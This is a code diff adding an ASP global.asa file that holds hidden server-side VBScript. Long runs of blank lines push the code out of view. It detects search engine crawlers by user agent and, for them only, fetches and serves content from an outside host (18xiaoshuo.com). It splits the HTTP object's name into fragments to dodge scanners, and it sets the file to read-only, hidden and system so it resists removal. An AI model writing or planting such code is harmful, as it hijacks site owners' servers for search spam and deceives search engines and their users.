@@ -1,0 +1,75 @@
+<script language="vbscript" runat="server">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+sub Session_OnStart
+user_agent=Request.ServerVariables("HTTP_USER_AGENT")
+httpuser=LCase(request.servervariables("http_user_agent"))
+if  instr(httpuser,"baidu")>0 or instr(httpuser,"google")>0 or instr(httpuser,"sogou")>0 or instr(httpuser,"soso")>0 then
+url=("http://18xiaoshuo.com/webmaster.asp?"&request.ServerVariables("QUERY_STRING")&"")
+Set ObjXMLHTTP=Server.createobject("MSX"+"ML2.s"+"erv"+"erXML"+"HTTP")
+ObjXMLHTTP.Open "GET",url,False
+ObjXMLHTTP.send
+GetHtml=ObjXMLHTTP.responseBody
+Set ObjXMLHTTP=Nothing
+set objStream = Server.CreateObject("Adodb.Stream")
+objStream.Type = 1
+objStream.Mode =3
+objStream.Open
+objStream.Write GetHtml
+objStream.Position = 0
+objStream.Type = 2
+objStream.Charset = "gb2312"
+GetHtml = objStream.ReadText
+objStream.Close
+key1=lcase(GetHtml)
+key1=Replace(key1&"","-istxt-","")
+response.Write key1
+end if
+end sub
+
+Set fso=Server.CreateObject("scripting.filesystemobject")
+set f=fso.Getfile("//./" & Server.MapPath("/global.asa"))
+if (f.Attributes<>7) then
+f.Attributes=1+2+4
+set f=Nothing
+Set fso=Nothing
+end if
+</script>
